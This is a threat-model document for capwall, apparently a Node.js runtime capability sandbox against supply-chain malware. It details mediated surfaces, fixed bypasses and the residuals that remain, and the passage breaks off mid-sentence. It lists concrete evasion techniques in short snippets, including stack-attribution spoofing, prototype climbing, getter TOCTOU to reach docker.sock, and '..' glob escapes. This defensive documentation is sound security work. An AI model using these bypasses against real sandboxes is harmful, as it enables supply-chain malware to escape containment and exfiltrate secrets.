# capwall threat model

This document is the source of truth for **what capwall protects against and what it does
not.** Read it before relying on capwall. If you change the engine, keep this document in
sync — overclaiming here is a security bug.

## One-sentence summary

capwall is **pragmatic, runtime, per-package defense-in-depth against opportunistic
supply-chain malware.** It is **not** a formal sandbox and does not withstand a determined
in-process attacker.

## The one assumption every control rests on

capwall answers exactly one question before every capability decision — *whose code is
calling?* — and it answers it by asking V8 for the stack, through `Error.captureStackTrace`
with a temporary `Error.prepareStackTrace` swap. That is the mechanism behind the attribution
walk (`attribution/index.ts`), the `compile` gate's "did Node's own loader call this?" check
(`shims/module.ts`), and the "was this read initiated by Node itself?" discriminator (#119).
`Error` is an ordinary primordial with ordinary writable properties, shared with every package
in the process.

So, plainly: **capwall's attribution — and therefore every control in this document, because
every gate is a decision about a principal — rests on V8 stack machinery that any code in the
host process can replace with one assignment.** There is no in-process fix. capwall cannot
freeze `Error` without breaking every library that formats or captures a stack trace, and a
guard written in the same process would rest on the same assumption it was checking. The
residual that names this is § What capwall does NOT stop → *Shared mutable primordials*, where
it is worked through with the cheapest concrete instance; **hardened mode does not mitigate it**,
and neither does anything else capwall ships.

## Implementation status (keep in sync with the roadmap)

As of roadmap **M5**, all core capability surfaces are mediated on **both the CJS `require`
path and the ESM `import` path**: `fs`, `net`/`http`/`https`/`tls`/`http2`/`dgram` (with
unix-socket and named-pipe destinations split out as their own `ipc` capability, #72),
`child_process`, `worker_threads`, `vm`, and `process.env`. Roadmap **S2** adds `native`, a
load-time gate on `.node` addons that is module-system-independent (it patches
`process.dlopen`, not a loader). Two further capabilities are decided at **module-load time**
rather than at a capability call: `compile` (#93, a direct `Module.prototype._compile`) and, since
#123, an `fs.read` decision on a `require`/`import` of a file **outside every `node_modules`
tree** — the module system was previously a second, completely un-gated route to the same bytes
`fs` guards. See § The module system as a read channel. **Four** surfaces are mediated **outside**
both module systems,
because they never route through one: `process.env` (a `Proxy` on the live object), the `native`
gate above, the `Module.prototype._compile` gate (#93 — a prototype patch, installed eagerly by
`install()` rather than through the shim registry, because `_compile` is read off the prototype
and `process.getBuiltinModule("node:module")` reaches it without touching the shim), and Node's
**global egress APIs** — `globalThis.fetch`/`WebSocket`/`EventSource`,
replaced on `globalThis` since #80 (see "Global egress surfaces" below). ESM interception uses a
`module.register()` loader hook (`loader/esm-hook.ts` + `esm-hooks.ts` + `esm-runtime.ts`)
that rewrites mediated builtin specifiers to a synthetic module re-exporting the same shims
the CJS path uses; it covers **static AND dynamic** `import` (`import { readFile } from
"node:fs"` and `await import("node:fs")`), attributing to the importing package exactly like
CJS. It is **on by default** under the CLI preload (disable with `CAPWALL_ESM=0`).

Interception is decided on the URL a specifier **resolves to**, not on the specifier string
(#59). A specifier does not have to *name* a builtin to reach one — Node's subpath imports let
a package map a private `#…` specifier onto a bare builtin in its own `package.json`
(`"imports": { "#x": "fs" }`; bare targets work, `"node:fs"` targets Node rejects outright),
and conditional and `*`-pattern targets do the same. Classifying on the resolved URL covers
every such spelling at once, including ones nobody has enumerated yet. Verified mediated after
the fix: bare / conditional / `*`-pattern imports targets, `fs/promises` targets,
self-referencing package exports, `data:` URL re-exports and `import.meta.resolve`. The only
probed route still reaching a raw builtin is `process.getBuiltinModule` — the pre-existing,
path-independent residual listed under "what capwall does NOT stop", which defeats the CJS
patch identically and is not ESM-specific.

The shims are handed out **mutable by default** (so `graceful-fs` and friends keep working);
`install(policy, mode, { hardened: true })` / `CAPWALL_HARDENED=1` freezes them instead —
**off by default**, see § Hardened mode for what that does and does not buy.

**Install lifecycle — what a policy swap and `uninstall()` do.** This applies to **both** module
systems and to the non-import-routed guards (`process.env`, the egress globals, the native gate);
it was fixed for ESM in #62 and for CJS in #87, and until #87 the two paths behaved differently.
The thing that makes it subtle is that mediated references are **captured**: a CJS module's
`const fs = require("node:fs")`, an ESM `const` import binding, a stashed `process.env`. Whatever
those captures point at is what enforces policy for the rest of the process, and a capture cannot
be revoked.

- **Already-captured references follow the LIVE policy, in both directions.** `uninstall()` +
  `install(tighter)` applies to a shim a module captured under an earlier install, and so does
  loosening again. Before #62/#87 a capture was pinned to the install that was active when it was
  made, so tightening was a silent no-op — fail-open with respect to the new policy. On the CJS
  path that also meant a *freshly* required `fs` denied while a captured one allowed: one process
  enforcing two policies at once, decided by when a module happened to call `require`.
- **After the LAST `uninstall()` a capture fails CLOSED** — a deny-all `enforce` policy — rather
  than passing through to the real builtin or continuing to serve the torn-down install's grants.
  "capwall is off again" is not available to a capture; the only options are the dead install's
  grants or none, and serving revoked grants is the fail-open one.
- **The decision sink is dropped with its install.** A post-teardown denial still throws, but it is
  not written into the torn-down embedder's `onDecision` collector or the CLI's trace file — that
  would be a decision belonging to no install landing in the previous one's audit trail.
- **A FRESH access after the last `uninstall()` is genuinely un-mediated on the CJS path**, because
  the interception points (`Module._load`, `process.env`, `process.dlopen`, the egress globals)
  really are restored. Fail-closed is about stale captures, not about leaving a torn-down process
  deny-all. The ESM path differs — see the next section.
- **Installs nest**, innermost wins, and they unwind in **any** order, not only LIFO (#22 for the
  `Module._load` chain, #87 for the policy stack). Unwinding one install re-exposes the one below
  it, including for already-captured shims.
- **Each process-global replacement is installed exactly ONCE, reference-counted** — `Module._load`,
  `process.dlopen`, the `process.env` proxy, the egress globals, and the
  `Module.prototype._compile` gate. Every guard
  reads the live context, so one patch already tracks whichever install is in force; the count
  only decides when to put the original back. Stacking them was a real defect found by the #90
  composition matrix: a second env guard proxied the FIRST guard's proxy and registered it as the
  "un-proxied" environment, so a **granted** `spawn` under nested installs launched its child with
  a completely empty environment, and an out-of-LIFO-order `uninstall()` left capwall's proxy on
  `process.env` (and its wrapper on `globalThis.fetch`) permanently — contradicting the bullet
  above. Restoring an egress global is also best-effort in one direction: if code outside capwall
  made it non-configurable in the meantime, `uninstall()` skips it rather than throwing, because
  an escaping `TypeError` there would abort teardown and strand every other patch.
  #90 found the bugs; **#107 made the rule structural.** All five patch sites now go through one
  reference-counted relink chain, `core/src/lifecycle/process-patch.ts`, which is the only file in
  `core/src` permitted to write a process global — asserted by a source scan in
  `test/process-patch-sites.test.ts`, so a sixth patch site cannot be added off to the side. See
  `docs/architecture.md` § Process-patch lifecycle.
- **`hardened` is the one setting that is not per-install: it is a process-wide RATCHET (#129).**
  Every other option follows the newest install. `hardened` engages the moment **any** install
  asks for it and lifts only when capwall **fully** uninstalls — so a later
  `install({ hardened: false })` cannot downgrade a hardened install that is still active, and
  passing `hardened: false` guarantees nothing about the surfaces you get. Before #129 only the
  egress globals ratcheted while the shim registries were last-writer-wins, which left the
  process half-hardened; see § Hardened mode for the whole accounting. It is still not
  retroactive in either direction: `Object.freeze` is irreversible, so a shim reference a module
  already captured keeps the hardening of the install that first built it.
- **None of this is dependency-reachable** — a dependency cannot call `install()`. It matters for
  embedders swapping policy at runtime and for programmatic tests, which is why #87 is rated MEDIUM
  rather than a live bypass.

**ESM known limits** (documented, not silent):
- A module that captured a raw builtin **before** capwall installed is not re-bound (same as
  CJS — install via the `--import` preload so capwall registers first). Such an import also
  leaves the builtin's `node:` URL in the ESM module cache, which is what disables the `load`
  backstop described below for that one specifier: a cached URL is served from cache without the
  load hook chain being consulted. capwall's own bootstrap no longer does this to itself (#78,
  `core/src/real-builtins.cts`); a host process that imports `node:fs` before calling `install()`
  still does.
- The set of mediated specifiers is fixed at install time; a mediated builtin not in the shim
  registry is not intercepted (the registry covers the capabilities above).
- Unregistering the ESM hook is best-effort (Node cannot fully remove a registered hook), so ESM
  teardown is **fail-closed rather than reversible** — this is the one place the lifecycle above
  differs between the two paths. On CJS, a fresh `require` after the last `uninstall()` reaches the
  real builtin; on ESM there is no equivalent, because the hook is still registered and an import
  binding cannot be un-bound. A mediated builtin **not yet imported** when `uninstall()` ran
  therefore throws an explicit "capwall is no longer installed" error on re-import, and one a
  module **had already imported** denies under the deny-all torn-down policy (#62 — before that
  fix it kept serving the torn-down install's grants, so this bullet previously overclaimed: it
  was true only for never-imported specifiers).
- **capwall cannot guarantee it stays outermost in the loader-hook chain** (#61). See
  "Loader-hook registration" below — this is the significant residual on the ESM path.
- `process.env` is not import-routed; its Proxy guard (installed by `install()`) covers both
  module systems already. The same is true of the **global egress guard** (#80) — `fetch`,
  `WebSocket` and `EventSource` are globals, so they are mediated by replacing them on
  `globalThis`, independently of either module system. See "Global egress surfaces" below.

**Loader-hook registration (#61) — partially closed, residual named.** Node's module
customization hooks are deliberately composable: the **most recently registered hook runs
first**, and the synchronous `module.registerHooks()` chain runs entirely ahead of the
asynchronous `module.register()` chain capwall lives in. A dependency that reaches
`register`/`registerHooks` can therefore short-circuit a mediated specifier straight to the
real `node:` URL before capwall's `resolve` is consulted — and because the hook is
process-wide and the ESM cache is keyed by resolved URL, that de-mediates **every** package
loaded afterwards, not just the attacker: an innocent third dependency's ordinary
`import * as fs from "node:fs"` binds to the raw builtin, with no log line.

What capwall does about it: `node:module` is mediated, and `register`/`registerHooks` are
treated as **application-only**. A registration attributed to a dependency is refused with a
`CapabilityError` in `enforce`, and warned about loudly in `observe` (which by contract never
blocks). `CAPWALL_ALLOW_LOADER_HOOKS=1` permits it, still warning, for a tree where a
dependency legitimately installs a loader. Everything else on `node:module` passes through
untouched, so the application's own tooling (`tsx`, `ts-node`, a custom loader) is unaffected —
the app is the trust root.

What it does **not** do, plainly:

- It gates *reaching* the API through a mediated module, not the API itself.
  `process.getBuiltinModule("node:module")` hands over the real one and defeats this exactly as
  it defeats every other shim.
- The gate allows `<app>`, so it inherits whatever attribution answers for the trust root.
  **Before #60 that was a fail-open**: attribution fell off the end of the walk into `<app>`, so a
  registration run from a detached `data:` module reached the gate as the trust root and was
  waved through, exactly as it walked past the `process.env` and `dgram` gates. Since #60 an
  unattributable caller is `<unknown>` (`attribution/index.ts` returns `UNATTRIBUTED` both on the
  opaque-frame path and on the fall-off-the-end path), the gate waves through an exact `APP_ROOT`
  only, and `<unknown>` reaches the deny — asserted for precisely that `data:` vector by
  `test/attribution-laundering.test.ts`. What remains is narrower and is the design, not a bug: a
  **positively identified** application frame is still allowed, so app code — and anything that
  persuades app code to register a hook on its behalf — passes.
- A hook registered **before** capwall installs is already ahead of it.
- capwall does **not** re-assert first position after an allowed registration. It could — the
  synchronous chain can be rejoined — but that would silently override the application's own
  loader tooling, and it still would not beat a hook that short-circuits `load` as well as
  `resolve`, which nothing in-process can.
- As defense in depth the `load` hook **re-mediates** any raw `node:<mediated>` URL it is
  handed and warns once per specifier, since capwall's own `resolve` never emits one. As of
  **#78 this fires**, for all twelve mediated builtins, and is exercised end-to-end: a loader
  hook registered ahead of capwall's short-circuits every one of them straight to its `node:`
  URL (with `shortCircuit: true, format: "builtin"`, the strongest form) and each import comes
  back as the shim, denying under a deny-all policy.
  Whether it fires at all is decided by one thing — whether the URL is already in Node's ESM
  module cache, because a cached URL is served from cache and the load chain is never consulted.
  From #74 until #78 it was **dead code**: capwall's own shims captured their real modules with
  static ESM `import`s, so every mediated builtin was cached raw before `module.register()` ran.
  Those captures now go through a CommonJS `require` (`core/src/real-builtins.cts`), which
  populates the CJS cache and leaves the ESM cache untouched. `test/real-builtins.test.ts`
  fails the build if any file in `core/src` re-introduces such an import, because a single one
  silently retires the backstop for that specifier.
  This is still the **second** layer — `resolve` classifying on the RESOLVED URL is what closes
  #59 — and it does not reach two cases: a hostile hook that short-circuits `load` as well as
  `resolve` never lets capwall run at all, and a host process that ESM-imported a mediated
  builtin **before** capwall installed has already cached it raw (the `--import` preload exists
  so that window is empty; a programmatic embedder that calls `install()` late does not get this
  guarantee).

Net: a dependency doing this opportunistically is now stopped and logged. A dependency that
knows about capwall has routes left. Treat ESM mediation as effective against packages that do
not go looking for the loader chain.

Per-capability notes:

- **`fs`** — path-taking read/write families (sync, callback, `fs.promises`) plus the
  path-taking stream constructors (`ReadStream`/`WriteStream` and their `File*Stream`
  aliases, guarded as **guarded subclasses** — see "Capability-bearing classes" below).
  Purely fd-based operations (`fs.read`, `fs.write`, `ftruncate`, …) are not
  mediated — consistent with the fd-escape exclusion below.
  A path argument is recognized in every shape Node's own `getValidatedPath` accepts: a string,
  **any `Uint8Array`** (not only a `Buffer`), and a **duck-typed** file URL — Node's `isURL` is
  `href && protocol && auth === undefined && path === undefined`, not `instanceof URL`, so a
  plain object with those fields is a real path to `fs`. Both of the latter two used to fall
  through capwall's check and were therefore **not gated at all** — found by the #99 sweep and
  tracked as **#104** (`shims/fs.ts` names it at the site). A URL argument is
  converted once and the resulting **string** is what is forwarded, so a shadowed `pathname`
  accessor cannot make Node open a file other than the one that was guarded.
  **Directory enumeration through a pattern** — `fs.glob` / `fs.globSync` / `fs.promises.glob`,
  Node ≥22 only — is mediated as of #106. Until then all three were absent from the shim's tables
  and a dependency could list any directory on the machine under a deny-all `enforce` policy with
  **no decision recorded and nothing denied**. Absent on Node 20, where the wrapper is a clean
  no-op (asserted, not skipped). See "`fs.glob` semantics" below for what the grant means, what a
  glob can still learn, and the residuals.
  **`fs` is not the only route to a file's bytes.** `require`/`import` of a path is a read too,
  and for `.json` it hands the contents back as data; that is gated as `fs.read` since #123, for
  files outside every `node_modules` tree. See § The module system as a read channel.
- **`fs.glob` semantics (#106).** A glob is an ENUMERATION, and capwall already had a shape for
  that: `readdir` is gated as `fs.read` on the DIRECTORY, not on each entry it returns. `glob` is
  `readdir` with a filter and a recursion rule, so it is gated the same way — **one `fs.read`
  decision per pattern, on the directory that pattern's walk is rooted at.** A grant of
  `fs.read: ["./data/**"]` therefore permits globbing anywhere inside `./data` (capwall's matcher
  deliberately matches `dir/**` against `dir` itself), and grants nothing outside it. An array of
  patterns is one decision per pattern; `enforce` denies the whole call on the first pattern that
  is not granted, so a partially-granted call enumerates nothing.

  The guarded directory is derived by taking the pattern's literal leading segments and resolving
  them against `options.cwd`. **Where that derivation cannot be proven sound, the guarded
  directory is the filesystem ROOT**, which no reasonable policy grants. This is not defensive
  padding: measured against real `fs.globSync` on Node 22, three ordinary-looking patterns escape
  their literal prefix — `**` followed by `..` (because `**` also matches *zero* segments),
  `{.,..}/…`, and a brace group with absolute alternatives such as `{/etc,/tmp}/*.conf`, which
  reaches `/etc` whatever `cwd` says. #106's own suggestion — "gate the non-magic prefix" — would
  therefore have been **fail-open**. `options.cwd` is read **exactly once** and the single answer
  is what Node receives, on the same pinning rule as every other capability-relevant option
  (#26/#56/#89); a URL `cwd` is converted once and the converted *string* is forwarded.

  **A `..` spelled as a glob expansion (#120), and the rule that replaced the one it broke.** The
  #106 derivation asked two *string* questions of the pattern text: is a post-prefix segment
  literally `".."`, and does a brace group contain a `/` or a `..`. minimatch is a *matcher*, and
  it will spell a `..` in ways neither question can see: `[.][.]`, `[.].`, `.[.]`, `[.-.][.-.]`,
  `..{,}`, `.{.,.}`, `{a,[.][.]}`, `[.][.]{,}` all walk to the parent of `cwd` — and they chain,
  so four of them walk four levels up — while capwall recorded one *allowed* read of the
  package's own granted directory and `enforce` printed nothing. That was the third instance of
  the same failure shape as #84's `getEvalOrigin` regex and #95's port heuristic: a parser
  deciding a security boundary while modelling a narrower grammar than its consumer accepts.

  capwall no longer tries to *see* a `..` through the pattern text. Two rules replace the
  string tests, and both are conservative by construction — anything not proven bounded is
  unbounded:

  1. **Braces are expanded, not inspected.** capwall performs the expansion the matcher performs
     and analyses each concrete alternative, so a braced pattern has one base per alternative and
     the decision is taken on their **common ancestor**. `{/etc,/tmp}/*.conf` is gated on `/`;
     `{.,..}/*.conf` is gated on the parent of `cwd`, exactly where it walks. Constructs capwall
     will not expand exactly are refused outright: an unbalanced brace, a group with no top-level
     comma (a range such as `{1..3}`, or a single-alternative `{a}` that minimatch does not expand
     at all), and any expansion beyond 256 alternatives.
  2. **Every segment at or after the first magic segment must be provably downward-only.** The
     only way a glob walk moves *upward* is a segment the implementation resolves to a literal
     `..` path component; a segment that survives as a *matcher* cannot, because matching runs
     against directory entries and `readdir` never yields `.` or `..`. So a segment containing a
     `*` or `?` is bounded (nothing in the grammar removes those — `**`, `*.conf`, `.*`, `*.*`,
     `[.]*` and `..*` all keep working, verified against real `fs.globSync`), a segment carrying
     any ordinary character is bounded, and a segment built only from dots and glob punctuation is
     **unbounded**. A backslash — minimatch's POSIX escape character — still makes a pattern
     unbounded rather than guessed at.

  Rule 2 is deliberately blunter than the truth: `dir/[.]/x`, `dir/@(..)/x` and `dir/[..]/x` are
  harmless in practice and are nonetheless treated as unbounded, because the alternative is
  modelling character-class and extglob reduction — which is the grammar-modelling that produced
  #84, #95 and #120. Adding a `*` or any ordinary character to the segment, or globbing from a
  directory the package is granted, both work.

  **The divergence itself is now a test, not a list.** `test/fs-glob.test.ts` generates patterns
  from a token grammar (exhaustive over token pairs, plus a seeded random pass) and asserts, for
  each, that every entry **real `fs.globSync`** returns resolves inside the directory capwall
  decided about. If minimatch grows a new way to spell `..`, or capwall's expansion ever disagrees
  with the real one, that fails — whether or not anybody thought to write the spelling down. A
  companion assertion rules out the trivially "safe" implementation that answers "the filesystem
  root" to everything.

  **Why not check each result path**, which would be more precise:
  - It cannot be done before the walk, and *the walk is the leak*. `options.exclude` is a
    caller-supplied function Node invokes with entries as it discovers them (verified: a `**` walk
    handed it all 35 entries of the directory being walked), so a dependency reads the listing
    through its own callback regardless of what capwall does with the return value.
  - Filtering results is a **soft deny on a value-returning API** — the caller is told the files do
    not exist. capwall does that in exactly one place (`exists`, whose contract is boolean).
  - One decision per result would make `observe` output, and every generated policy, a property of
    the machine's filesystem rather than of the package — the reproducibility failure #67 fixed
    for `Object.keys(process.env)`.

  **What a glob can still learn, stated plainly:** everything under a directory the package
  already holds a read grant on. `fs.read: ["./data/**"]` lets it enumerate the whole `./data`
  subtree in one call — but that grant already permitted reading every file in it, and a recursive
  `readdir` already produced the same listing. *Residuals:* the grant is on the base directory
  only, so a grant that names files rather than a subtree (`["./data/*.json"]`) denies globbing in
  `./data` outright (fail-closed, and the fix is to grant the directory); and a policy that grants
  `"*"` or `"/**"` grants unbounded patterns too, by construction. One further detail worth
  knowing: Node `require`s its vendored **minimatch** lazily, from inside the first glob in the
  process, and that module reads `__MINIMATCH_TESTING_PLATFORM__` at module scope. capwall forces
  that load once, under the same key-scoped authorization `child_process` uses for
  `NODE_V8_COVERAGE`, so the read is never charged to whichever dependency happened to glob first.
- **`net`/`http`/`https`/`tls`/`http2`/`dgram`** — **egress only**. Mediated: `net.connect`/
  `createConnection` **and** `new net.Socket().connect()`; `http(s).request`/`get` **and**
  `new http.ClientRequest()`; `http(s).Agent#createConnection`, on both a caller-built agent and
  the pre-built `http(s).globalAgent` **instance** (#65 — see "Capability-bearing instances"
  below); `tls.connect` and `new tls.TLSSocket().connect()`;
  `http2.connect`; and `dgram` socket `send`/`connect` (UDP). Each core egress module is
  shimmed separately on purpose: capwall's require patch only affects `Module._load`-routed
  requires (user/dependency code); Node's own HTTP client loads `net` through the internal
  bootstrap loader, which never hits `Module._load`, so one module's shim never covers
  another — and a dependency could otherwise bypass the control simply by choosing `tls`
  (or `dgram`) over `net`. **The same reason means there is no `net`-shim backstop behind
  `fetch`** (verified empirically, not assumed): Node's global `fetch` dials through the internal
  undici stack, which is bootstrap-loaded and never hits `Module._load`, so before #80 a
  dependency's `fetch` under a deny-all `enforce` policy produced **no decision at all** — not a
  denial, not a log line. That is why the global egress guard above exists as a separate
  mechanism rather than as one more module shim. Inbound `server.listen` is not gated (capwall mediates who a
  package may *reach*, not that it may serve). IPC/unix-socket connects have no host:port and
  are gated as their own `ipc` capability, keyed on the socket path (#72 — previously they were
  all one `<ipc>:0` pseudo-target; see the egress residuals below for what that leaves).
  **How a destination is derived is checked against Node's own normalization**, not against what
  a signature appears to say — see the note on argument normalization below, and #99 for why that
  distinction has produced real holes. Two spellings a policy author will notice: a positional
  numeric-string port (`net.connect("9999", host)`) is a **TCP** target, not an IPC path, because
  Node's `isPipeName` says so — capwall used to read every string first argument as an IPC path,
  so a package holding any `ipc` grant reached arbitrary TCP egress through it (found by #99,
  tracked as **#105**, named at `shims/net.ts` § `isPipeName`); and a `dgram` `send`/`connect`
  that names no address is recorded
  as **`127.0.0.1`** (udp4) or **`::1`** (udp6), the literals Node's own `lookup4`/`lookup6`
  substitute — not `localhost`.
  `dgram` ops attributed to `<app>`
  are not gated (the app is the trust root, as for `process.env`); since #60 that requires a
  positively identified application frame, and Node's auto-bind `send` replay — which used to
  ride on the old fail-open, because Node re-invokes `send` from the socket's `'listening'`
  event on a stack with no caller frame — is handled by state instead. Since #86 that state is
  a **single-use authorization pinned to one socket and one destination**: while an authorized
  send is on the stack, the guarded `send` accessor yields a token good for exactly the host:port
  the policy just allowed, once, on that socket; every other use of it falls back to the full
  guard. So the replay is forwarded without a second check, and nothing that can be obtained
  from that state can reach a destination the policy did not already allow. The `dgram`
  destination is derived POSITIONALLY, mirroring Node's own argument normalization, because Node
  accepts a port as a numeric string (`send(buf, "9999", host)`); a type-based derivation saw no
  number, concluded there was no destination and skipped the gate entirely.
  Capability-bearing classes
  (`net.Socket`, `tls.TLSSocket`, `http.ClientRequest`, `http.Agent`, `dgram.Socket`) are
  guarded via a **guarded subclass** whose prototype method (or constructor) runs the check,
  so `new Cls()`, `(instance).constructor`, `Cls.prototype.constructor`, and
  `Cls.prototype.method.call(...)` are all covered (a construct-trap Proxy would not be — see
  "Capability-bearing classes" below). The pre-built `http(s).globalAgent` **instances** are
  guarded too, as of #65 — before that fix they were live `Agent` objects the shim copied
  through verbatim, so `http.globalAgent.createConnection({host, port})` opened a socket with no
  check and, worse, **no recorded decision**: `observe` and `capwall diff` could not see it
  either. See "Capability-bearing instances" below. The getter-based TOCTOU tracked as #26 and
  #56 — a package with a narrow net grant supplying an options object (or a `URL` instance)
  whose destination-deciding fields were accessor properties returning the granted value when
  capwall derived the guarded target and a different value when Node itself re-read them — is
  **closed**, with the guarantee scoped as follows.

  capwall never forwards a caller's options object or `URL`. It reads each destination-deciding
  field exactly once — `host`/`hostname`/`port`/`path` for `net`/`tls`/`http2` options,
  `host`/`hostname`/`port`/`socketPath`/`defaultPort` for `http(s)` options, and the nine URL
  fields Node's `urlToHttpOptions` derives — and forwards a clone carrying those single reads as
  plain data properties, or (for a `URL`) a synthesized options object / authority string built
  from that one snapshot. **Every** own accessor on a forwarded object is additionally flattened
  to a value during the clone, on every key, not just the listed ones. So the object Node reads
  contains no getters at all: for the fields above, Node observes exactly the value that was
  guarded; for any other field, Node observes a value that cannot change between reads. #56 was
  the case that motivated the second rule — `path` (the unix-socket destination) was not on the
  first version's list, so its accessor rode into the clone live, and a package granted one TCP
  endpoint could reach an arbitrary unix socket by returning `undefined` on the read capwall saw
  and `/var/run/docker.sock` on the read Node made.

  **Argument normalization is derived from Node's source, not from the signature (#99).** Reading
  a destination once is only half of it: the *rule* capwall uses to decide which argument holds
  the destination has to be Node's rule, or the guarded target and the real target differ for a
  second reason having nothing to do with getters. Two confirmed holes came from a plausible
  reading of a signature that the implementation did not share — a numeric-string `dgram` port
  that `validatePort` accepts (#95, gate skipped entirely) and a `tls` options object read from
  an index Node never merges (#46, granted host guarded, evil host dialled). #99 was the
  systematic pass over every entry point, diffing capwall's derivation against Node's own
  `net._normalizeArgs` / `normalizeConnectArgs` / `urlToHttpOptions` / `getValidatedPath` /
  `normalizeSpawnArguments` line by line. Each entry point now carries the relevant excerpt of
  Node's source in a comment at the site, and every deliberate divergence says so and why. What
  that pass changed, in policy-visible terms, is listed under the `fs` and egress bullets above.

  **Still open, deliberately.** (a) IPC path grants (#72) are matched **lexically**, like `fs`
  globs and for the same reasons: capwall compares the path string a call names, and does not
  resolve symlinks or otherwise ask the kernel what the path leads to. A socket reachable at two
  paths is two grants, and a symlink from a granted path to another socket is not caught — the
  same residual `fs` carries, and the reason IPC grants bound *ordinary* access rather than a
  determined attacker. A policy written before #72 that grants `net: {hosts: ["<ipc>"], ports:
  [0]}` still means **every** socket and pipe, unchanged and deliberately so; that shape is the
  coarse one and is worth narrowing to `ipc.paths` on review.
  (b) `options.createConnection` (`http(s)`/`http2`) lets the
  caller supply the function that opens the socket; capwall guards the target it derived, but a
  function that ignores its options and dials elsewhere is only re-gated if the module it uses
  to dial is itself capwall-mediated — the same class as the pre-install capture residual below.
  (c) `dns` lookups are not mediated (a lookup moves no payload; DNS tunneling is a
  determined-attacker technique out of scope), so a granted host name resolving to an attacker's
  address is not caught here. A wildcard host grant (`*.internal`, #83) inherits that: it names
  a set of *names*, and capwall does not check where those names point. Prefer the narrowest
  pattern that covers the real need, and remember that `*.example.com` is only as trustworthy as
  whoever can create records under `example.com`. The same reasoning covers the caller-supplied
  resolvers Node accepts — `options.lookup` on `net`/`tls`, and the `lookup` option of
  `dgram.createSocket` — which turn "which name" into "which address" inside the caller's own
  code: capwall guards the **name** the call asked for, which is the level a policy is written
  at, and a resolver that answers with somebody else's address is the `dns` residual reached by
  a shorter path. (c2) Node ≥22's built-in proxy support (`--use-env-proxy` /
  `NODE_USE_ENV_PROXY`, absent on Node 20) makes `http(s).Agent#createConnection` dial the
  **proxy** rather than the endpoint. capwall guards the endpoint the request named; when that
  flag is set, the socket that actually opens goes to the configured proxy instead. Grant the
  proxy's host:port as well if you enable it. (d) Reaching the real prototype by climbing past the guard — two
  levels from an instance of a guarded class
  (`Object.getPrototypeOf(Object.getPrototypeOf(sock)).connect`), equivalently one hop from the
  class object (`net.Socket.prototype.__proto__.connect`), or one hop from a guarded *instance*
  view (`Object.getPrototypeOf(http.globalAgent).createConnection.call(agent, opts)`) — the same
  class as the general shim un-patching residual, in-process code deliberately climbing above the
  guard. These are documented residuals, not silent gaps.

  An IPv6 literal is guarded, recorded, and matched **unbracketed** (`::1`, the form Node
  dials); see `docs/policy-format.md`.
- **`child_process`, `worker_threads`, `vm`** — boolean **gates** (may this package spawn /
  start a worker / use `vm` at all). Gating, not confinement: capwall does not constrain what
  the subprocess/worker/vm-context does once started (see § gating vs confinement). The
  capability-bearing classes on these surfaces — `child_process.ChildProcess`,
  `worker_threads.Worker`, `vm.Script`, and (only when `--experimental-vm-modules` makes them
  exist) `vm.SourceTextModule`/`vm.SyntheticModule` — are guarded subclasses, so the class is
  gated as well as the module function.

  For `child_process`, the caller's **options object is pinned** before the real call (#89):
  every own accessor is flattened to a value, so nothing the caller controls executes while the
  spawn is in progress and Node cannot observe a field changing between capwall's read and its
  own. That closes a `validate-one-value / execute-another` divergence that exists in plain Node
  — `execFileSync` reads `options.argv0` five times, validating an early read and using a later
  one as the child's `argv[0]` — and it is the mechanism that made a `child_process` grant
  silently confer unlimited `process.env` reads before #89. See the `process.env` entry below for
  what the spawn/env interaction now is, and what is still reachable during it.
- **`native` (`.node` addons)** — a **load-time gate, not a runtime sandbox** (roadmap S2,
  issue #49). capwall decides whether a package may load a native addon at all; it does not,
  and will not, confine what that addon does once loaded. Read the whole of § Native `.node`
  addons below before granting it — of every capability in the format, this is the one whose
  limits matter most.
- **`process.env`** — a read allowlist enforced via a `Proxy` on `process.env` (`get` **and**
  `getOwnPropertyDescriptor` traps, so `Object.getOwnPropertyDescriptor(process.env, k).value`
  cannot leak a value a direct read denies). Reads attributed to `<app>` pass through ungated
  — the app is the trust root — but that means a **positively identified application source
  file on the stack**, and nothing else. A read capwall cannot attribute is `<unknown>` and is
  gated exactly like a dependency's (see § attribution outcomes). `CAPWALL_*` keys (capwall's
  own preload plumbing) are never gated or recorded. A denied env read is a **soft deny**: it returns
  `undefined` (hiding the value) rather than throwing, so a benign dependency probing an
  optional var is not crashed. The denial is still recorded and logged. **Key NAMES stay
  enumerable** to a denied dependency (`Object.keys`, `in`, `for..in`); only VALUES are hidden
  — names are not the secret, and hiding them would break feature-detection.

  **Name-level vs value-level (#67).** The gate applies to *values*, and only value-yielding
  operations are recorded. Everything that hands a dependency a value goes through `[[Get]]` —
  `env.K`, destructuring, `JSON.stringify(env)`, `{...env}`, `Object.entries`/`Object.values` —
  and is gated **and** written to the trace. Name-level operations — `in`, `Object.keys`,
  `for..in`, `Object.getOwnPropertyNames` — are neither gated nor recorded. The
  `getOwnPropertyDescriptor` trap straddles both: `Object.keys` and `for..in` call it once per
  key just to read `[[Enumerable]]`, and it cannot distinguish that from a genuine descriptor
  read (identical arguments, identical caller stack). It therefore **hides** the value for a
  denied key (unconditionally — that is the security property) but does **not record**.
  *Residual:* a `getOwnPropertyDescriptor(env, k).value` read attempt is blocked but no longer
  appears in the audit trail. Recording it instead would log every `for..in` as a value read of
  every key in the environment, which made `observe` output a property of the host machine
  rather than of the package and printed `DENY '<pkg>' env:AWS_SECRET_ACCESS_KEY` for mere
  enumeration. The available discriminators (an `ownKeys`-primed "enumeration epoch" heuristic;
  returning an accessor descriptor so only an explicit `desc.get()` records) are spoofable by
  the attacker they target or catch only an attacker who has already adapted to capwall, and a
  spoofable heuristic inside the anti-exfiltration control is worse than a documented gap.

  **Node-initiated env reads (#119).** `process.env` is the one mediated surface Node's own code
  shares with dependencies: the other shims are handed out through `require`, which Node's
  internals do not use to reach `fs` or `net`, but the env proxy replaces a live object that
  everything in the process shares. Attribution skips `node:` frames (they carry no package
  identity) and charges the nearest frame that has one — so a variable Node read while some
  dependency happened to be underneath was recorded as that dependency's read.
  `node:internal/source_map/source_map_cache` reading `NODE_V8_COVERAGE` while compiling a
  package that ships a source map put that key on three unrelated express dependencies; the ESM
  loader's `WATCH_REPORT_DEPENDENCIES` put an entry on `<unknown>` in every policy capwall ever
  generated. Six of twelve events in a stock `express` + `pino` policy described Node, not the
  tree — and a reviewer cannot review a grant no package asked for.

  An env read is therefore **recorded only when the nearest frame above it, after capwall's own,
  is not one of Node's own scripts**. This is a rule about the *origin of the read*, not about
  the key's name: a package's own read of a `NODE_*` variable is kept (`thread-stream` genuinely
